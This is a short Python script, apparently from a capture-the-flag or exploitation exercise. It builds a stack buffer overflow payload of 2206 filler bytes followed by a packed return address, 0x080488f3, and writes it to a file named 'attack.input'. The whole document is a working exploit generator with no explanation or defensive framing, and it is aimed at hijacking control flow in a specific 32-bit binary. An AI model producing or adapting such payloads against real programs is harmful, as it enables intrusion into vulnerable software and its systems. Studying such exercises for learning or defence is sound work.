import struct
target_addr = 0x080488f3
target_bytes = struct.pack('<I', target_addr)
payload = b'a' * 2206 + target_bytes
with open('attack.input','wb') as f:
	f.write(payload)
